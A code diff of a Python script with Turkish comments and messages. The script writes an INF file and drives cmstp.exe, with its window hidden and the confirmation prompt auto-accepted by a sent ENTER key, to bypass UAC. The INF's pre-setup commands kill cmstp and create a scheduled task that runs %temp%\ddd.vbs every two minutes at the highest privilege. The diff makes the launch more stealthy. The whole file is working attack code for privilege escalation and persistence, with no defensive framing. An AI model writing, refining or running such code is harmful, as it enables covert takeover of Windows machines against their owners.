@@ -1,13 +1,45 @@
 import os
+import sys
 import subprocess
 import time
-import sys
 import ctypes
-try:
-    import psutil
-except ImportError:
-    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'psutil'])
-    import psutil
+
+def restart_script():
+    """restart."""
+    print("pywin32 succ. ress...")
+    time.sleep(2)
+    os.execv(sys.executable, [sys.executable] + sys.argv)
+
+def ensure_pywin32_installed():
+    try:
+        import win32con, win32gui, win32process
+        return True
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
+        python_dir = os.path.dirname(sys.executable)
+        scripts_dir = os.path.join(python_dir, "Scripts")
+        postinstall_script = os.path.join(scripts_dir, "pywin32_postinstall.py")
+
+       
+        if not os.path.isfile(postinstall_script):
+            import site
+            for dir in site.getsitepackages():
+                alt_path = os.path.join(dir, "pywin32_postinstall.py")
+                if os.path.isfile(alt_path):
+                    postinstall_script = alt_path
+                    break
+            else:
+                raise FileNotFoundError("pywin32_postinstall.py bulunamadı.")
+
+        subprocess.check_call([sys.executable, postinstall_script, "-install"])
+        return False
+
+if not ensure_pywin32_installed():
+    restart_script()
+
+import win32con
+import win32process
+import psutil
 
 user32 = ctypes.windll.user32
 
@@ -17,9 +49,7 @@ VK_RETURN = 0x0D
 
 def run_command(command, wait=True):
     result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    stdout = result.stdout.decode(errors='replace')
-    stderr = result.stderr.decode(errors='replace')
-    return result.returncode, stdout, stderr
+    return result.returncode, result.stdout.decode(errors='replace'), result.stderr.decode(errors='replace')
 
 def create_inf_file():
     temp_folder = os.getenv('TEMP')
@@ -33,7 +63,6 @@ CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
 
 [RunPreSetupCommandsSection]
-; Commands to run before setup begins
 taskkill /IM cmstp.exe /F
 cmd /c schtasks /create /tn "TempVBS" /tr "%temp%\\ddd.vbs" /sc minute /mo 2  /f /rl HIGHEST
 
@@ -61,8 +90,7 @@ def find_window_handle_by_process_name(proc_name):
         try:
             proc = psutil.Process(pid.value)
             if proc.name().lower() == proc_name.lower():
-                if user32.IsWindowVisible(hwnd):
-                    hwnds.append(hwnd)
+                hwnds.append(hwnd)
         except Exception:
             pass
         return True
@@ -70,54 +98,64 @@ def find_window_handle_by_process_name(proc_name):
     EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
     user32.EnumWindows(EnumWindowsProc(enum_windows_proc), 0)
 
-    if hwnds:
-        return hwnds[0]
-    return None
+    return hwnds[0] if hwnds else None
 
-def send_enter_via_postmessage(hwnd):
+def send_enter(hwnd):
     user32.PostMessageW(hwnd, WM_KEYDOWN, VK_RETURN, 0)
     time.sleep(0.05)
     user32.PostMessageW(hwnd, WM_KEYUP, VK_RETURN, 0)
 
+def run_cmstp_hidden(inf_path):
+    startup_info = win32process.STARTUPINFO()
+    startup_info.dwFlags |= win32process.STARTF_USESHOWWINDOW
+    startup_info.wShowWindow = win32con.SW_HIDE
+    cmd = f'cmstp.exe /au "{inf_path}"'
+    return win32process.CreateProcess(None, cmd, None, None, False, 0, None, None, startup_info)
+
 def main():
-    # Eski görevleri temizle
+    
     run_command('schtasks /delete /tn "InstallRequests" /f')
     run_command('schtasks /delete /tn "RunPowerShellScript" /f')
 
-    # Python kontrolü
+   
     returncode, _, _ = run_command("python --version")
     if returncode != 0:
-        # Python yoksa yükle
-        returncode, _, _ = run_command('first.exe /quiet InstallAllUsers=0 PrependPath=1')
-        if returncode != 0:
-            sys.exit(1)
+        print("Python yüklü değil, yüklenmesi gerekir. İşlem sonlandırılıyor.")
+        sys.exit(1)
 
-    # install_requests.py oluştur
+    
     temp_dir = os.getenv('TEMP')
     script_path = os.path.join(temp_dir, 'install_requests.py')
     with open(script_path, 'w') as script_file:
         script_file.write("import subprocess\n")
         script_file.write("subprocess.check_call(['python', '-m', 'pip', 'install', 'requests'])\n")
 
-    # Görev oluştur
+   
     returncode, _, stderr = run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st 00:00 /f')
     if returncode != 0:
         print(f"Failed to create task 'InstallRequests': {stderr}")
         sys.exit(1)
 
+    
     run_command('schtasks /run /tn "InstallRequests"')
 
+    
     time.sleep(10)
-    os.remove(script_path)
 
-    # INF dosyası oluştur
+    
+    try:
+        os.remove(script_path)
+    except Exception:
+        pass
+
+    
     inf_file_path = create_inf_file()
 
-    # cmstp.exe'yi INF dosyasıyla başlat
-    cmd = f'cmstp.exe /au "{inf_file_path}"'
-    subprocess.Popen(cmd, shell=True)
+    
+    proc_info = run_cmstp_hidden(inf_file_path)
+    print("cmstp.exe gizli başlatıldı.")
 
-    # cmstp.exe penceresi açılana kadar bekle (max 15 saniye)
+    
     hwnd = None
     for _ in range(15):
         hwnd = find_window_handle_by_process_name('cmstp.exe')
@@ -125,15 +163,12 @@ def main():
             break
         time.sleep(1)
 
-    if not hwnd:
+    if hwnd:
+        print(f"cmstp.exe penceresi bulundu: {hwnd}")
+        send_enter(hwnd)
+        print("ENTER tuşu gönderildi.")
+    else:
         print("cmstp.exe penceresi bulunamadı.")
-        sys.exit(1)
-
-    print(f"cmstp.exe penceresi bulundu: {hwnd}")
-
-    # ENTER tuşunu doğrudan pencereye gönder
-    send_enter_via_postmessage(hwnd)
-    print("ENTER tuşu gönderildi.")
 
 if __name__ == "__main__":
     main()
